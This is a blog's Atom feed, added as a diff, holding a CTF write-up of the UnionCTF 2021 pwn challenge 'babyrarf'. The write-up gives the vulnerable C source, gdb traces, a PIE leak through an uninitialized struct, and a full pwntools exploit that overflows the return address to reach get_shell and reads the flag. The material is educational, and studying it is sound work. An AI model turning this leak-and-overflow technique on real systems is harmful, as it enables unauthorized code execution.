@@ -1,0 +1,374 @@
+<?xml version="1.0" encoding="utf-8"?> 
+<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
+    <generator uri="https://gohugo.io/" version="0.92.2">Hugo</generator><title type="html"><![CDATA[buffer overflow on repr]]></title>
+    
+        <subtitle type="html"><![CDATA[pwn, RE, crypto stuff]]></subtitle>
+    
+    
+    
+            <link href="http://n4sm.github.io/tags/buffer-overflow/" rel="alternate" type="text/html" title="HTML" />
+            <link href="http://n4sm.github.io/tags/buffer-overflow/feed.xml" rel="self" type="application/atom+xml" title="Atom" />
+    <updated>2022-05-12T22:51:53+02:00</updated>
+    
+        <author>
+            <name>nasm</name>
+            
+                <email>nasm@pm.me</email>
+            </author>
+        
+    <id>http://n4sm.github.io/tags/buffer-overflow/</id>
+        
+        <entry>
+            <title type="html"><![CDATA[[UnionCTF 2021 - pwn] babyrarf]]></title>
+            <link href="http://n4sm.github.io/posts/babyrarf/?utm_source=atom_feed" rel="alternate" type="text/html"  hreflang="en" />
+            <id>http://n4sm.github.io/posts/babyrarf/</id>
+            
+            <published>2021-02-21T00:00:00+00:00</published>
+            <updated>2021-02-21T00:00:00+00:00</updated>
+            
+            
+            <content type="html"><![CDATA[<p>The binary can be found <a
+  class="gblog-markdown__link"
+  href="https://github.com/ret2school/ctf/blob/master/2021/unionctf/pwn/babyrarf/babyrarf?raw=true"
+  
+  >right here</a
+>.</p>
+<div class="gblog-post__anchorwrap">
+    <h2 id="unionctf-babyrarf">
+        [UnionCTF] Babyrarf
+        <a data-clipboard-text="http://n4sm.github.io/posts/babyrarf/#unionctf-babyrarf" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor [UnionCTF] Babyrarf" href="#unionctf-babyrarf">
+            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
+        </a>
+    </h2>
+</div>
+<p>Welcome guys,</p>
+<p>This Write-Up is about de first pwn challenge of the <a
+  class="gblog-markdown__link"
+  href="https://ctf.cr0wn.uk"
+  
+  >unionctf</a
+> event: <a
+  class="gblog-markdown__link"
+  href=""
+  
+  >babyrarf</a
+>.
+It is a stack based buffer overflow. The source code was provided so, no need to reverse the binary :).</p>
+<p>Let&rsquo;s take a look at the src!</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span><span class="cp"></span>
+<span class="k">typedef</span> <span class="k">struct</span> <span class="n">attack</span> <span class="p">{</span>
+    <span class="kt">uint64_t</span> <span class="n">id</span><span class="p">;</span>
+    <span class="kt">uint64_t</span> <span class="n">dmg</span><span class="p">;</span>
+<span class="p">}</span> <span class="n">attack</span><span class="p">;</span>
+
+<span class="k">typedef</span> <span class="k">struct</span> <span class="n">character</span> <span class="p">{</span>
+    <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span>
+    <span class="kt">int</span> <span class="n">health</span><span class="p">;</span>
+<span class="p">}</span> <span class="n">character</span><span class="p">;</span>
+
+<span class="kt">uint8_t</span> <span class="n">score</span><span class="p">;</span>
+
+<span class="kt">int</span> <span class="nf">read_int</span><span class="p">(){</span>
+    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span>
+    <span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
+    <span class="k">return</span> <span class="n">atoi</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">get_shell</span><span class="p">(){</span>
+    <span class="n">execve</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="n">attack</span> <span class="nf">choose_attack</span><span class="p">(){</span>
+    <span class="n">attack</span> <span class="n">a</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">id</span><span class="p">;</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Choose an attack:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;1. Knife</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;2. A bigger knife</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;3. Her Majesty&#39;s knife</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;4. A cr0wn</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+    <span class="n">id</span> <span class="o">=</span> <span class="n">read_int</span><span class="p">();</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">id</span> <span class="o">==</span> <span class="mi">1</span><span class="p">){</span>
+        <span class="n">a</span><span class="p">.</span><span class="n">id</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+        <span class="n">a</span><span class="p">.</span><span class="n">dmg</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">id</span> <span class="o">==</span> <span class="mi">2</span><span class="p">){</span>
+        <span class="n">a</span><span class="p">.</span><span class="n">id</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
+        <span class="n">a</span><span class="p">.</span><span class="n">dmg</span> <span class="o">=</span> <span class="mi">20</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">id</span> <span class="o">==</span> <span class="mi">3</span><span class="p">){</span>
+        <span class="n">a</span><span class="p">.</span><span class="n">id</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
+        <span class="n">a</span><span class="p">.</span><span class="n">dmg</span> <span class="o">=</span> <span class="mi">30</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">id</span> <span class="o">==</span> <span class="mi">4</span><span class="p">){</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">score</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
+            <span class="n">puts</span><span class="p">(</span><span class="s">&#34;l0zers don&#39;t get cr0wns</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">else</span><span class="p">{</span>
+            <span class="n">a</span><span class="p">.</span><span class="n">id</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
+            <span class="n">a</span><span class="p">.</span><span class="n">dmg</span> <span class="o">=</span> <span class="mi">40</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">else</span><span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Please select a valid attack next time</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+        <span class="n">a</span><span class="p">.</span><span class="n">id</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">a</span><span class="p">.</span><span class="n">dmg</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="n">a</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
+    <span class="n">character</span> <span class="n">player</span> <span class="o">=</span> <span class="p">{</span> <span class="p">.</span><span class="n">health</span> <span class="o">=</span> <span class="mi">100</span><span class="p">};</span>
+    <span class="n">character</span> <span class="n">boss</span> <span class="o">=</span> <span class="p">{</span> <span class="p">.</span><span class="n">health</span> <span class="o">=</span> <span class="mi">100</span><span class="p">,</span> <span class="p">.</span><span class="n">name</span> <span class="o">=</span> <span class="s">&#34;boss&#34;</span><span class="p">};</span>
+    <span class="n">attack</span> <span class="n">a</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">dmg</span><span class="p">;</span>
+
+    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="n">srand</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;You are fighting the rarf boss!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;What is your name?</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+    <span class="n">fgets</span><span class="p">(</span><span class="n">player</span><span class="p">.</span><span class="n">name</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
+
+    <span class="n">score</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>
+
+    <span class="k">while</span> <span class="p">(</span><span class="n">score</span> <span class="o">&lt;</span> <span class="mi">100</span><span class="p">){</span>
+        <span class="n">a</span> <span class="o">=</span> <span class="n">choose_attack</span><span class="p">();</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;You choose attack %llu</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">a</span><span class="p">.</span><span class="n">id</span><span class="p">);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;You deal %llu dmg</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">a</span><span class="p">.</span><span class="n">dmg</span><span class="p">);</span>
+        <span class="n">boss</span><span class="p">.</span><span class="n">health</span> <span class="o">-=</span> <span class="n">a</span><span class="p">.</span><span class="n">dmg</span><span class="p">;</span>
+        <span class="n">dmg</span> <span class="o">=</span> <span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mi">100</span><span class="p">;</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;The boss deals %llu dmg</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">dmg</span><span class="p">);</span>
+        <span class="n">player</span><span class="p">.</span><span class="n">health</span> <span class="o">-=</span> <span class="n">dmg</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">player</span><span class="p">.</span><span class="n">health</span> <span class="o">&gt;</span> <span class="n">boss</span><span class="p">.</span><span class="n">health</span><span class="p">){</span>
+            <span class="n">puts</span><span class="p">(</span><span class="s">&#34;You won!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+            <span class="n">score</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">else</span><span class="p">{</span>
+            <span class="n">puts</span><span class="p">(</span><span class="s">&#34;You lost!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+            <span class="n">score</span> <span class="o">-=</span> <span class="mi">1</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="n">player</span><span class="p">.</span><span class="n">health</span> <span class="o">=</span> <span class="mi">100</span><span class="p">;</span>
+        <span class="n">boss</span><span class="p">.</span><span class="n">health</span> <span class="o">=</span> <span class="mi">100</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Congratulations! You may now declare yourself the winner:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+    <span class="n">fgets</span><span class="p">(</span><span class="n">player</span><span class="p">.</span><span class="n">name</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+</code></pre></div><p>It&rsquo;s basically some kind of game, we have to win a lot of times to display <code>Congratulations! You may now declare yourself the winner</code>. And when we reach this part we can trigger a buffer overflow with a call to fgets (<code>fgets(player.name, 48, stdin);</code>). We notice too the get_shell function (maybe we will have to jump on ?).</p>
+<p>Let&rsquo;s take a look at gdb:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">────────────────────────────────────────────────────────── stack ────
+0x00007fffffffdf48│+0x0000: 0x00007ffff7dd30b3  →  &lt;__libc_start_main+243&gt; mov edi, eax	 ← <span class="nv">$rsp</span>
+0x00007fffffffdf50│+0x0008: 0x00007ffff7ffc620  →  0x0005081200000000
+0x00007fffffffdf58│+0x0010: 0x00007fffffffe038  →  0x00007fffffffe357  →  <span class="s2">&#34;/home/nasm/dist/babyrarf&#34;</span>
+0x00007fffffffdf60│+0x0018: 0x0000000100000000
+0x00007fffffffdf68│+0x0020: 0x00005555555552e4  →  &lt;main+0&gt; push rbp
+0x00007fffffffdf70│+0x0028: 0x00005555555554d0  →  &lt;__libc_csu_init+0&gt; endbr64 
+0x00007fffffffdf78│+0x0030: 0xdb21ca7fd193f05a
+0x00007fffffffdf80│+0x0038: 0x00005555555550b0  →  &lt;_start+0&gt; endbr64 
+─────────────────────────────────────────────────────────── code:x86:64 ────
+   0x5555555552de &lt;choose_attack+234&gt; mov    rdx, QWORD PTR <span class="o">[</span>rbp-0x18<span class="o">]</span>
+   0x5555555552e2 &lt;choose_attack+238&gt; leave  
+   0x5555555552e3 &lt;choose_attack+239&gt; ret    
+ → 0x5555555552e4 &lt;main+0&gt;         push   rbp
+   0x5555555552e5 &lt;main+1&gt;         mov    rbp, rsp
+   0x5555555552e8 &lt;main+4&gt;         sub    rsp, 0x40
+   0x5555555552ec &lt;main+8&gt;         mov    QWORD PTR <span class="o">[</span>rbp-0x20<span class="o">]</span>, 0x0
+   0x5555555552f4 &lt;main+16&gt;        mov    QWORD PTR <span class="o">[</span>rbp-0x18<span class="o">]</span>, 0x0
+   0x5555555552fc &lt;main+24&gt;        mov    DWORD PTR <span class="o">[</span>rbp-0x14<span class="o">]</span>, 0x64
+─────────────────────────────────────────────────────────── threads ────
+<span class="o">[</span><span class="c1">#0] Id 1, Name: &#34;babyrarf&#34;, stopped 0x5555555552e4 in main (), reason: BREAKPOINT</span>
+─────────────────────────────────────────────────────────── trace ────
+<span class="o">[</span><span class="c1">#0] 0x5555555552e4 → main()</span>
+gef➤  
+</code></pre></div><p>And at the call to fgets:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">   0x55555555537d &lt;main+153&gt;       lea    rax, <span class="o">[</span>rbp-0x20<span class="o">]</span>
+   0x555555555381 &lt;main+157&gt;       mov    esi, 0xa
+   0x555555555386 &lt;main+162&gt;       mov    rdi, rax
+ → 0x555555555389 &lt;main+165&gt;       call   0x555555555060 &lt;fgets@plt&gt;
+   ↳  0x555555555060 &lt;fgets@plt+0&gt;    jmp    QWORD PTR <span class="o">[</span>rip+0x2fca<span class="o">]</span>        <span class="c1"># 0x555555558030 &lt;fgets@got.plt&gt;</span>
+      0x555555555066 &lt;fgets@plt+6&gt;    push   0x3
+      0x55555555506b &lt;fgets@plt+11&gt;   jmp    0x555555555020
+      0x555555555070 &lt;execve@plt+0&gt;   jmp    QWORD PTR <span class="o">[</span>rip+0x2fc2<span class="o">]</span>        <span class="c1"># 0x555555558038 &lt;execve@got.plt&gt;</span>
+      0x555555555076 &lt;execve@plt+6&gt;   push   0x4
+      0x55555555507b &lt;execve@plt+11&gt;  jmp    0x555555555020
+────────────────────────────────────────────────────────── arguments <span class="o">(</span>guessed<span class="o">)</span> ────
+fgets@plt <span class="o">(</span>
+   <span class="nv">$rdi</span> <span class="o">=</span> 0x00007fffffffdf20 → 0x0000000000000000,
+   <span class="nv">$rsi</span> <span class="o">=</span> 0x000000000000000a,
+   <span class="nv">$rdx</span> <span class="o">=</span> 0x00007ffff7f97980 → 0x00000000fbad208b
+<span class="o">)</span>
+</code></pre></div><p>So main the return address minus player.name is equal to: <code>0x00007fffffffdf48 - 0x00007fffffffdf20 = 40 </code>.
+So we have basically a padding of 40 bytes before the return address, and according to the last fgets, we can only provide 48 bytes.
+Which means we can overwrite only the return address.</p>
+<p>Now we can take a look at the permissions:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">gef➤  checksec
+<span class="o">[</span>+<span class="o">]</span> checksec <span class="k">for</span> <span class="s1">&#39;/home/nasm/dist/babyrarf&#39;</span>
+Canary                        : ✘ 
+NX                            : ✓ 
+PIE                           : ✓ 
+Fortify                       : ✘ 
+RelRO                         : Partial
+</code></pre></div><p>We can see, the binary is PIE based, so in order to jump on get_shell we need to leak some binary&rsquo;s functions.
+To do so we can mind the code of <code>choose_attack</code> function:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="n">attack</span> <span class="nf">choose_attack</span><span class="p">(){</span>
+    <span class="n">attack</span> <span class="n">a</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">id</span><span class="p">;</span>
+    <span class="cm">/* Some print stuff */</span>
+    <span class="n">id</span> <span class="o">=</span> <span class="n">read_int</span><span class="p">();</span> <span class="c1">// It is readinf the type of weapons we want
+</span><span class="c1"></span>    
+    <span class="cm">/* Here it is handling properly dammage and weapon type */</span>
+
+    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">id</span> <span class="o">==</span> <span class="mi">4</span><span class="p">){</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">score</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
+            <span class="n">puts</span><span class="p">(</span><span class="s">&#34;l0zers don&#39;t get cr0wns</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">else</span><span class="p">{</span>
+            <span class="n">a</span><span class="p">.</span><span class="n">id</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
+            <span class="n">a</span><span class="p">.</span><span class="n">dmg</span> <span class="o">=</span> <span class="mi">40</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">else</span><span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Please select a valid attack next time</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+        <span class="n">a</span><span class="p">.</span><span class="n">id</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">a</span><span class="p">.</span><span class="n">dmg</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="n">a</span><span class="p">;</span>
+<span class="p">}</span>
+
+</code></pre></div><p>The interesting part is that when our score is zero and that we choose the fourth weapon, the id et dmg fields are not initialized.
+And so it&rsquo;s returning a non initialized struct that it will print just next in the main function:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c">
+    <span class="cm">/* ... */</span>
+    <span class="n">a</span> <span class="o">=</span> <span class="n">choose_attack</span><span class="p">();</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;You choose attack %llu</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">a</span><span class="p">.</span><span class="n">id</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;You deal %llu dmg</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">a</span><span class="p">.</span><span class="n">dmg</span><span class="p">);</span>
+    <span class="cm">/*...*/</span>
+
+</code></pre></div><p>Uninitialized structures are very useful to obtain leaks because their content is depending of the ancient stackframes which have stored local variables and especially useful pointers.
+And when we try to leak these datas, we can see that a.id displays the address of <code>__lib_csu_init</code>.
+So we just need to leak the address of <code>__lib_csu_init</code> to compute the base address of the binary and so the address of <code>get_shell</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python">
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="c1">#p = process(&#34;babyrarf&#34;)</span>
+
+<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;35.204.144.114&#39;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
+<span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;babyrarf&#39;</span><span class="p">)</span>
+
+<span class="n">set_</span> <span class="o">=</span> <span class="kc">False</span>
+<span class="n">base</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">csu_leak</span> <span class="o">=</span> <span class="mi">0</span>
+
+<span class="k">def</span> <span class="nf">padd</span><span class="p">(</span><span class="n">d</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">d</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\00</span><span class="s1">&#39;</span><span class="o">*</span><span class="p">(</span><span class="mi">8</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">d</span><span class="p">))</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;What is your name?</span><span class="se">\n\n</span><span class="s2">&#34;</span><span class="p">))</span>
+<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;nasm&#34;</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;4. A cr0wn</span><span class="se">\n\n</span><span class="s2">&#34;</span><span class="p">))</span>
+<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
+
+<span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+    <span class="n">a</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;4. A cr0wn</span><span class="se">\n\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">a</span><span class="p">:</span>
+        <span class="k">break</span>
+    <span class="nb">print</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+    
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">set_</span><span class="p">:</span>
+        <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;4&#34;</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
+
+    <span class="n">b</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;You choose attack &#34;</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="s2">&#34;l0zers don&#39;t get cr0wns&#34;</span> <span class="ow">in</span> <span class="n">b</span><span class="p">:</span>
+        <span class="n">leak_csu</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">padd</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)))</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;leak_csu=</span><span class="si">{}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">leak_csu</span><span class="p">))))</span>
+        <span class="n">base</span> <span class="o">=</span> <span class="n">leak_csu</span> <span class="o">-</span> <span class="n">e</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;__libc_csu_init&#39;</span><span class="p">]</span>
+
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;base: </span><span class="si">{}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">base</span><span class="p">)))</span>
+
+        <span class="n">set_</span> <span class="o">=</span> <span class="kc">True</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Congratulations! You may now declare yourself the winner:</span><span class="se">\n\n</span><span class="s2">&#34;</span><span class="p">))</span>
+
+<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">40</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;get_shell&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="n">base</span><span class="p">))</span>
+<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+
+</code></pre></div><p>We can compute the value of rand to avoid bruteforce, but I&rsquo;ve chosen to do not. So while it does not print <code>l0zers don't get cr0wns</code>, I&rsquo;m sending 4 <code>for cr0wn</code> and when it prints the right pattern I get my leak of the csu and I compute the base address.
+When that&rsquo;s done I&rsquo;m sending 1 because it sounds more speed and I wait to win.
+And when I won I can trigger the buffer overflow and jmp on <code>get_shell</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">/* ... */
+/* lot of iterations */
+/* ... */
+
+You deal <span class="m">40</span> dmg
+The boss deals <span class="m">70</span> dmg
+You lost!
+
+Choose an attack:
+
+1. Knife
+
+2. A bigger knife
+
+3. Her Majesty<span class="err">&#39;</span>s knife
+
+4. A cr0wn
+
+
+<span class="nv">leak_csu</span><span class="o">=</span>0x55b3b5b3a4d0
+base: 0x55b3b5b39000
+You deal <span class="m">140736258161760</span> dmg
+The boss deals <span class="m">96</span> dmg
+You lost!
+
+Congratulations! You may now <span class="nb">declare</span> yourself the winner:
+
+
+<span class="o">[</span>*<span class="o">]</span> Switching to interactive mode
+$ cat /home/babyrarf/flag.txt
+union<span class="o">{</span>baby_rarf_d0o_d00_do0_doo_do0_d0o<span class="o">}</span>
+</code></pre></div><p>The final script can be found <a
+  class="gblog-markdown__link"
+  href="https://github.com/ret2school/ctf/blob/master/2021/unionctf/pwn/babyrarf/p0wn.py"
+  
+  >here</a
+>.</p>
+<p>That&rsquo;s all folks :)</p>
+]]></content>
+            
+                 
+                    
+                 
+                    
+                         
+                        
+                            
+                             
+                                <category scheme="http://n4sm.github.io/tags/ctf" term="ctf" label="ctf" />
+                             
+                                <category scheme="http://n4sm.github.io/tags/unionCTF-2021" term="unionCTF-2021" label="unionCTF 2021" />
+                             
+                                <category scheme="http://n4sm.github.io/tags/pwn" term="pwn" label="pwn" />
+                             
+                                <category scheme="http://n4sm.github.io/tags/buffer-overflow" term="buffer-overflow" label="buffer overflow" />
+                             
+                                <category scheme="http://n4sm.github.io/tags/nasm" term="nasm" label="nasm" />
+                             
+                                <category scheme="http://n4sm.github.io/tags/2021" term="2021" label="2021" />
+                            
+                        
+                    
+                
+            
+        </entry>
+    
+</feed>
